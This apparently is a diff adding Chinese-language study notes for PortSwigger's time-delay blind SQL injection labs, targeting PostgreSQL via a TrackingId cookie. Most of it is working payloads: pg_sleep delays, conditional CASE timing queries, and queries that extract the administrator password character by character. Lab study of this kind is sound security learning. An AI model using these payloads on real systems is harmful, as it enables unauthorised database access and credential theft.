@@ -1,0 +1,33 @@
+### 时间延迟盲注 ###
+https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
+注入点 Cookie: TrackingId=
+@@ 使用 '|| pg_sleep(10) -- @@
+|| 在PostgreSQL中将 pg_sleep() 返回值隐式转为布尔值，于是仅限于此数据库，不会发生报错
+
+
+https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
+注入点 Cookie: TrackingId=
+使用上个实验的 
+'|| pg_sleep(10) -- 
+延迟10秒
+
+'|| pg_sleep(10) -- 
+
+
+使用构建的条件语句
+@ CASE表达式中的分支返回类型应当相同，似乎返回void @
+'||(SELECT CASE WHEN (条件语句) THEN pg_sleep(3) ELSE pg_sleep(0) END) --
+@@ 另一种需将分隔符 ; 编码为%3B，如直接使用将作为HTTP报头参数的分隔符 @@
+'%3B(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END) --
+
+使用 LENGTH 获得字符串长度，可手动二分，可发送到攻击器
+'||(SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username = 'administrator')) = 20) THEN pg_sleep(3) ELSE pg_sleep(0) END) --
+密码长度为20
+
+使用提供的表名与列名与用户名构成输入，使用集群炸弹字符串范围1-20，字符范围小写字符与数字
+'||(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), $1$, 1) = '$1$') THEN pg_sleep(3) ELSE pg_sleep(0) END) --
+
+@ 示例解决方案 @
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+
